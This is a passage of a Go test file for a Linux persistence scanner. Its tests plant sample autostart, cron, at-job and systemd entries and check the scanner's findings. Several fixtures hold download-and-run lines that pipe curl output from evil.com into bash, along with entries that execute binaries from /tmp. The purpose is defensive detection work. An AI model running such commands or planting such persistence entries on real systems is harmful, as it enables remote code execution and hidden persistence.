	if err := os.WriteFile(filepath.Join(autostartDir, "implant.desktop"), []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := persistence.NewXDGAutoStartScannerWithHomeBase(homeBase)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for /dev/shm exec, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// ScheduledScanner — checkAtSpoolDir with recent file
// ---------------------------------------------------------------------------

func TestScheduledScanner_RecentAtJobFileFlagged(t *testing.T) {
	dir := t.TempDir()
	// Create a file with an at-job-like name that is recent.
	jobFile := filepath.Join(dir, "a000001aa7c68000") // typical at job filename
	if err := os.WriteFile(jobFile, []byte("#!/bin/bash\nid\n"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := persistence.NewScheduledScannerWithDir(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "scheduled" && f.Severity == scanner.SevMedium {
			found = true
		}
	}
	if !found {
		t.Errorf("expected MEDIUM finding for at job file, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// XDGAutoStartScanner — scanDesktopFile uncovered paths
// ---------------------------------------------------------------------------

// TestXDGAutoStart_NoNameField covers the entryName fallback to filepath.Base.
func TestXDGAutoStart_NoNameField_FallsBackToFilename(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	// Desktop file with no Name= field, exec from /tmp → CRITICAL.
	desktop := filepath.Join(dir, "noname.desktop")
	content := "[Desktop Entry]\nExec=/tmp/evil\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDesktopFileForTest(s, desktop, false)
	if len(findings) == 0 {
		t.Errorf("expected finding for /tmp exec, got none")
	}
}

// TestXDGAutoStart_EnvPrefixBinaryExtracted covers the "env" prefix stripping.
func TestXDGAutoStart_EnvPrefixBinaryExtracted(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	// Exec="env FOO=bar /tmp/evil" — binary should be extracted as /tmp/evil.
	desktop := filepath.Join(dir, "envprefix.desktop")
	content := "[Desktop Entry]\nName=EnvTest\nExec=env FOO=bar /tmp/evil\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDesktopFileForTest(s, desktop, false)
	found := false
	for _, f := range findings {
		if f.Title == "XDG autostart entry executes binary from world-writable directory" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected /tmp exec finding after env prefix stripping, got: %+v", findings)
	}
}

// TestXDGAutoStart_IsRecentEscalatesSeverity covers the isRecent=true escalation path.
func TestXDGAutoStart_IsRecentEscalatesSeverity(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	// Exec from /tmp with isRecent=true → CRITICAL.
	desktop := filepath.Join(dir, "recent.desktop")
	content := "[Desktop Entry]\nName=RecentTest\nExec=/tmp/malware\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDesktopFileForTest(s, desktop, true)
	for _, f := range findings {
		if f.Severity != scanner.SevCritical {
			t.Errorf("expected CRITICAL severity for recent exec-from-tmp, got %v", f.Severity)
		}
	}
}

// TestXDGAutoStart_SuspiciousPatternCurl covers the suspicious exec pattern path.
func TestXDGAutoStart_SuspiciousPatternCurl_CriticalFinding(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	desktop := filepath.Join(dir, "suspicious.desktop")
	content := "[Desktop Entry]\nName=Updater\nExec=/usr/bin/bash -c \"curl http://evil.com/script.sh | bash\"\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDesktopFileForTest(s, desktop, false)
	found := false
	for _, f := range findings {
		if f.Title == "Suspicious command in XDG autostart entry" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected suspicious command finding, got: %+v", findings)
	}
}

// TestXDGAutoStart_IsRecentEscalatesExistingFindings exercises the
// "else if isRecent" branch that escalates severity of already-found issues.
func TestXDGAutoStart_IsRecentEscalatesExistingCriticalFindings(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	// Use curl (suspicious pattern → CRITICAL), then isRecent=true should escalate.
	desktop := filepath.Join(dir, "recent_suspicious.desktop")
	content := "[Desktop Entry]\nName=Updater\nExec=curl -s http://evil.com | bash\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDesktopFileForTest(s, desktop, true)
	if len(findings) == 0 {
		t.Error("expected findings for suspicious recent autostart, got none")
	}
}

// ---------------------------------------------------------------------------
// scanCronScriptDirs — via export_test.go: directory-skip path
// ---------------------------------------------------------------------------

func TestScanCronScriptDirs_SubdirSkipped(t *testing.T) {
	dir := t.TempDir()
	// Create a subdirectory — it should be skipped.
	if err := os.MkdirAll(filepath.Join(dir, "subdir"), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	// Create a clean script.
	if err := os.WriteFile(filepath.Join(dir, "cleanscript"), []byte("#!/bin/bash\necho hello\n"), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanCronScriptDirsForTest([]string{dir})
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean scripts, got %d: %+v", len(findings), findings)
	}
}

// ---------------------------------------------------------------------------
// scanCronScriptDirs — suspicious content in script
// ---------------------------------------------------------------------------

func TestScanCronScriptDirs_SuspiciousScriptContent(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "backdoor")
	content := "#!/bin/bash\ncurl -s http://evil.com | bash\n"
	if err := os.WriteFile(script, []byte(content), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanCronScriptDirsForTest([]string{dir})
	if len(findings) == 0 {
		t.Errorf("expected findings for suspicious cron script content, got none")
	}
}

// ---------------------------------------------------------------------------
// ScheduledScanner — at spool dir coverage
// ---------------------------------------------------------------------------

func TestScheduledScanner_AtSpoolDir_OldJobNotRecent(t *testing.T) {
	dir := t.TempDir()
	jobFile := filepath.Join(dir, "a000002aa7c68000")
	if err := os.WriteFile(jobFile, []byte("#!/bin/sh\nid\n"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	// Set mtime > 7 days ago so it's not "recent".
	old := time.Now().Add(-8 * 24 * time.Hour)
	if err := os.Chtimes(jobFile, old, old); err != nil {
		t.Fatalf("Chtimes: %v", err)
	}

	s := persistence.NewScheduledScannerWithDir(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Title == "At job file found in spool directory" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected at-job finding for old file, got: %+v", findings)
	}
}

func TestScheduledScanner_AtSpoolDir_ShortNameSkipped(t *testing.T) {
	dir := t.TempDir()
	// Single-char filename — should be skipped (len < 2).
	if err := os.WriteFile(filepath.Join(dir, "x"), []byte("data"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewScheduledScannerWithDir(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	for _, f := range findings {
		if f.Title == "At job file found in spool directory" {
			t.Errorf("short filename should be skipped, got finding: %+v", f)
		}
	}
}

func TestScheduledScanner_AtSpoolDir_DirectorySkipped(t *testing.T) {
	dir := t.TempDir()
	// Subdirectory should be skipped.
	if err := os.MkdirAll(filepath.Join(dir, "a0000subdir"), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	s := persistence.NewScheduledScannerWithDir(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	for _, f := range findings {
		if f.Title == "At job file found in spool directory" {
			t.Errorf("subdirectory should be skipped, got finding: %+v", f)
		}
	}
}

// ---------------------------------------------------------------------------
// parseAtqOutput — empty line skip path
// ---------------------------------------------------------------------------

func TestParseAtqOutput_EmptyLinesSkipped(t *testing.T) {
	// Output with blank lines between entries.
	output := "\n1\tMon Jan  1 00:00:00 2024 a root\n\n2\tTue Jan  2 00:00:00 2024 a root\n\n"
	findings := persistence.ParseAtqOutput(output)
	if len(findings) != 2 {
		t.Errorf("expected 2 findings (empty lines skipped), got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// ScanSystemdTimerForTest — user-level and system-level paths
// ---------------------------------------------------------------------------

func TestScanSystemdTimer_UserLevel_FindingGenerated(t *testing.T) {
	dir := t.TempDir()
	timerPath := filepath.Join(dir, "my-backdoor.timer")
	if err := os.WriteFile(timerPath, []byte("[Timer]\nOnBootSec=5min\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanSystemdTimerForTest(timerPath, true)
	if len(findings) == 0 {
		t.Fatal("expected finding for user-level timer, got none")
	}
	if findings[0].Title != "User-level systemd timer" {
		t.Errorf("unexpected title: %q", findings[0].Title)
	}
}

func TestScanSystemdTimer_SystemLevel_NoFinding(t *testing.T) {
	dir := t.TempDir()
	timerPath := filepath.Join(dir, "system.timer")
	if err := os.WriteFile(timerPath, []byte("[Timer]\nOnCalendar=daily\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanSystemdTimerForTest(timerPath, false)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for system-level timer, got %d: %+v", len(findings), findings)
	}
}

// ---------------------------------------------------------------------------
// scanUserSystemdDir — coverage via ScanUserSystemdDirForTest
// ---------------------------------------------------------------------------

func TestScanUserSystemdDir_WithTimerFile(t *testing.T) {
	dir := t.TempDir()
	// Create a .timer file in the dir.
	if err := os.WriteFile(filepath.Join(dir, "persist.timer"), []byte("[Timer]\nOnBootSec=1min\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanUserSystemdDirForTest(dir)
	found := false
	for _, f := range findings {
		if f.Title == "User-level systemd timer" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected user-level timer finding, got: %+v", findings)
	}
}

func TestScanUserSystemdDir_WithServiceFile(t *testing.T) {
	dir := t.TempDir()
	// Create a .service file with a suspicious exec pattern.
	content := "[Service]\nExecStart=/tmp/evil.sh\n"
	if err := os.WriteFile(filepath.Join(dir, "evil.service"), []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanUserSystemdDirForTest(dir)
	found := false
	for _, f := range findings {
		if f.Scanner == "systemd" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected systemd finding from user service in /tmp, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// XDGAutoStartScanner — Scan exercises collectAutostartDirs with missing home
// ---------------------------------------------------------------------------

func TestXDGAutoStartScanner_Scan_EmptyDirsNoFindings(t *testing.T) {
	s := persistence.NewXDGAutoStartScannerWithPaths(t.TempDir(), t.TempDir())
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty dirs, got %d", len(findings))
	}
}

// TestXDGAutoStart_NonSuspiciousExec_TriggersIsPackageOwned exercises the
// isPackageOwned path — binary is not in a suspicious path and has no bad patterns.
func TestXDGAutoStart_NonSuspiciousExec_TriggersIsPackageOwned(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	desktop := filepath.Join(dir, "app.desktop")
	// Use a path outside suspicious dirs that won't match exec patterns.
	content := "[Desktop Entry]\nName=MyApp\nExec=/usr/local/bin/totally-unknown-app-xyz\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	// This exercises the isPackageOwned check path (no suspicious pattern or path).
	findings := persistence.ScanDesktopFileForTest(s, desktop, false)
	// Result depends on whether dpkg is available and whether the binary is "owned".
	// Just verify no panic and that the finding (if any) is valid.
	for _, f := range findings {
		if f.ID == "" {
			t.Error("finding has empty ID")
		}
	}
}

// TestXDGAutoStart_NonSuspiciousExecRecentEscalates exercises the
// "else if isRecent" escalation branch with an already-unknown-binary finding.
func TestXDGAutoStart_NonSuspiciousExecRecent_EscalatesToCritical(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(dir, dir)

	desktop := filepath.Join(dir, "app_recent.desktop")
	content := "[Desktop Entry]\nName=RecentApp\nExec=/usr/local/bin/very-unknown-binary-xyz123\n"
	if err := os.WriteFile(desktop, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	// With isRecent=true, the finding (if any) should be CRITICAL.
	findings := persistence.ScanDesktopFileForTest(s, desktop, true)
	for _, f := range findings {
		if f.Severity != scanner.SevCritical {
			t.Errorf("expected CRITICAL for recent unknown binary, got %v: %+v", f.Severity, f)
		}
	}
}

// ---------------------------------------------------------------------------
// CronScanner — Scan with no suspicious files (empty dir coverage)
// ---------------------------------------------------------------------------

func TestCronScanner_Scan_DoesNotError(t *testing.T) {
	s := persistence.NewCronScanner()
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
}

// ---------------------------------------------------------------------------
// scanCronScriptDirs — world-writable script detection
// ---------------------------------------------------------------------------

func TestScanCronScriptDirs_WorldWritable_HighFinding(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "myscript")
	if err := os.WriteFile(script, []byte("#!/bin/bash\necho clean\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	if err := os.Chmod(script, 0o666); err != nil {
		t.Fatalf("Chmod: %v", err)
	}

	findings := persistence.ScanCronScriptDirsForTest([]string{dir})
	found := false
	for _, f := range findings {
		if f.Title == "World-writable cron script" || f.Title == "World-writable root-owned cron script" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected world-writable cron script finding, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// fmt import used
// ---------------------------------------------------------------------------

var _ = fmt.Sprintf
